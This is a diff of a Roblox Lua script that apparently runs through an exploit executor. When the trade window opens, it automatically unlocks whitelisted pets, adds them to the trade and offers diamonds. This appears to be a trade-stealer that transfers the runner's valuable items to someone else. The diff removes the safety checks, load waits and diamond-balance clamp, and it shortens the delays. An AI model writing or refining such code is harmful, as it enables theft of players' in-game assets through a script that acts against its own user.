@@ -94,65 +94,21 @@ local Whitelisted = {
 }
 
 local function AddWhitelistedPets()
-    if not getgenv().here or getgenv().aol then
-        return
-    end
-
-    -- Wait until pet data is loaded
-    repeat
-    task.wait()
-until ClientDataManager.Data
-    and ClientDataManager.Data.Pets
-    and ClientDataManager.Data.Currency
-    local added = 0
-
     for petID, petData in pairs(ClientDataManager.Data.Pets) do
-        -- Safety checks
-        if petData and petData.Type and petData.Class then
-            local success, petName = pcall(function()
-                return PetsInfo:GetPetFullName(petData.Type, petData.Class)
-            end)
+        local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
 
-            if success and petName and Whitelisted[petName] then
-                -- Unlock pet if needed
-                if petData.Locked then
-                    ReplicatedStorage.Events.UIAction:FireServer("TogglePetLocked", petID)
-                    task.wait(0.1)
-                end
-
-                -- Add pet to trade
-                ReplicatedStorage.Events.UIAction:FireServer("AddPetInTrade", petID)
-
-                added += 1
-                task.wait(0.1) -- Prevent remote spam
+        if Whitelisted[petName] and getgenv().here and not getgenv().aol then
+            if petData.Locked then
+                ReplicatedStorage.Events.UIAction:FireServer("TogglePetLocked", petID)
             end
+
+            ReplicatedStorage.Events.UIAction:FireServer("AddPetInTrade", petID)
         end
     end
-
-    return added
 end
 
 local function ModifyDiamondOffer(amount)
-    if not getgenv().here or getgenv().aol then
-        return
-    end
-
-    -- Wait until player data is fully loaded
-    repeat
-        task.wait()
-    until ClientDataManager.Data
-        and ClientDataManager.Data.Currency
-        and ClientDataManager.Data.Currency.Diamonds
-
-    -- Make sure amount is valid
-    amount = tonumber(amount) or 0
-
-    -- Prevent negatives or over-offering
-    local currentDiamonds = ClientDataManager.Data.Currency.Diamonds
-    amount = math.clamp(amount, 0, currentDiamonds)
-
-    -- Only send if there's actually something to offer
-    if amount > 0 then
+    if getgenv().here and not getgenv().aol then
         ReplicatedStorage.Events.UIAction:FireServer("ModifyDiamondOffer", amount)
     end
 end
@@ -221,9 +177,9 @@ TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
 
     -- IMPORTANT:
     -- Give the trade session time to initialize server-side
-    task.wait(2)
+    task.wait(0.5)
     task.spawn(rt)
-    local addedPets = AddWhitelistedPets()
+    AddWhitelistedPets()
     task.wait(0.5)
     ModifyDiamondOffer(Diamonds)
 end)
